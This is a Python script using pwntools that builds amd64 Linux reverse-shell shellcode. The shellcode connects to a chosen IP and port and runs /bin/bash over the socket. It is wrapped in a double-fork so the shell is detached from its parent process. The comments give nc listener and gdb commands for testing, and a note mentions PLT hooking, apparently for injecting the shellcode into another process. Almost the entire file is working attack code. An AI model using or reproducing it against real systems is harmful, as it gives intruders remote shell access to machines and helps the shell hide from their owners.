# date: 20191216
# author: thinkycx
# description:
#       this script is used to generate shellcode : fork fork and run shellcode and the shellcode's PPID is 0
#       run this script and you will get the program to test the shellcode
# usage:
#       python inject_shellcode.py 127.0.0.1 7777
#       get the process name, such as: /tmp/pwn-asm-cPEmKu/step3
#       terminal1: 
#           nc -lvvp 7777
#       terminal1:
#           gdb /tmp/pwn-asm-cPEmKu/step3 --ex "set follow-fork-mode parent" --ex "start" --ex "break fork_fork_shellcode_end"  --ex "c"


from pwn import *
import pwnlib
import sys


def fork_fork_shellcode(shellcode='/* shellcode */\n nop; \n'):
    '''
    a shellcode wrapper, which will let the shellcode's parent PID is 0
    fork- (and continue)
         |_ fork (and exit)
               |_ shellcode (which parent's PID is 0)
    
    registers affected: 
        rax, edi
    '''
    # 1 first fork
    sc = pwnlib.shellcraft.amd64.linux.fork()
    sc += 'cmp rax, 1; \n jnl fork_fork_shellcode_end; \n'          # jmp to the end for parent        jnl -> end       (parent)
    # 2 second fork
    sc += pwnlib.shellcraft.amd64.linux.forkexit()                  # jmp to the shellcode for child   jl  -> shellcode (child)
    # 3 shellcode
    sc += shellcode
    # 4 end
    sc += 'fork_fork_shellcode_end:\n nop; nop; nop; \n'            # use gdb to break fork_fork_shellcode_end+1 and to see the output
    # print sc                                                    
    return sc

def reverse_shellcode(ip, port):
    '''
    use pwntools to generate shellcode
    1. http://docs.pwntools.com/en/stable/shellcraft/amd64.html#module-pwnlib.shellcraft.amd64.linux
    2. https://github.com/Gallopsled/pwntools/blob/292b81af179e25e7810e068b3c06a567256afd1d/pwnlib/shellcraft/templates/amd64/linux/sh.asm
    '''
    sc = pwnlib.shellcraft.amd64.linux.connect(ip, port, network='ipv4')
    # sc += pwnlib.shellcraft.amd64.linux.dupsh(sock='rbp')
    # or ..
    sc += pwnlib.shellcraft.amd64.linux.dup(sock='rbp')
    sc += pwnlib.shellcraft.amd64.linux.execve('/bin/bash', ['/bin/bash'], 0)
    
    return sc


def getshellcode(ip='127.0.0.1', port=7777):
    context.arch='amd64'
    shellcode = reverse_shellcode(ip, port)
    sc = fork_fork_shellcode(shellcode)
    sc += 'plt_hook_end: nop;nop;nop;'                 # for plt hook jmp condition in util.py
    # asm(sc, arch='amd64'))
    return sc
    # return sc

if __name__ == "__main__":
    ip = '127.0.0.1'
    port = 7777
    context.arch='amd64'

    if len(sys.argv) != 3:
        print '[*] python injectshellcode.py <ip> <port>'
        exit(0)
    else:
        ip = sys.argv[1]
        port = int(sys.argv[2])
    print '[*] IP %s PORT: %s' % (ip, port)

    shellcode = reverse_shellcode(ip, port)
    sc = fork_fork_shellcode(shellcode)
    # run 
    # run_assembly(sc)
    # print sc
    print asm(sc, arch='amd64')
    raw_input('exit?')
    



